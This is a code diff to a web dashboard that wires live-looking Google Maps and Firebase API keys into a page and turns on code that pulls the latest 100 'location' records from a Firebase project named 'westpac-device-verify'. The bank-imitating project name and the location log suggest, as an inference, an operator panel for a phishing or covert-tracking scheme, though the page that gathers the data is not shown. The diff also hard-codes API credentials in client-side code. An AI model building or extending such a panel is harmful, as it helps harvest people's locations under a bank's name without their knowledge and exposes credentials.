@@ -101,18 +101,24 @@
     
     <!-- Google Maps -->
     <script async defer
-        src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&callback=initMap">
+        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDqWFUWwJx7XeGj3l6hZ-TPEvJHAQKP8Vo&callback=initMap">
     </script>
 
     <script>
         // Firebase configuration (same as in script.js)
         const firebaseConfig = {
-            // Add your Firebase config here
+            apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
+            authDomain: "westpac-device-verify.firebaseapp.com",
+            projectId: "westpac-device-verify",
+            storageBucket: "westpac-device-verify.appspot.com",
+            messagingSenderId: "458791455321",
+            appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e",
+            databaseURL: "https://westpac-device-verify-default-rtdb.firebaseio.com"
         };
 
         // Initialize Firebase
-        // firebase.initializeApp(firebaseConfig);
-        // const database = firebase.database();
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
         let map;
         let markers = [];
@@ -125,8 +131,7 @@
         }
 
         function refreshData() {
-            // Once Firebase is set up, uncomment this to fetch real data:
-            /*
+            // Fetch real data from Firebase
             database.ref('locations').orderByChild('timestamp').limitToLast(100).once('value')
                 .then(snapshot => {
                     const logsTable = document.getElementById('logsTable');
@@ -159,9 +164,6 @@
                     console.error('Error fetching data:', error);
                     alert('Error fetching data. Please try again.');
                 });
-            */
-
-            // For demonstration, add some dummy data
             const dummyData = [
                 {
                     timestamp: new Date().toISOString(),
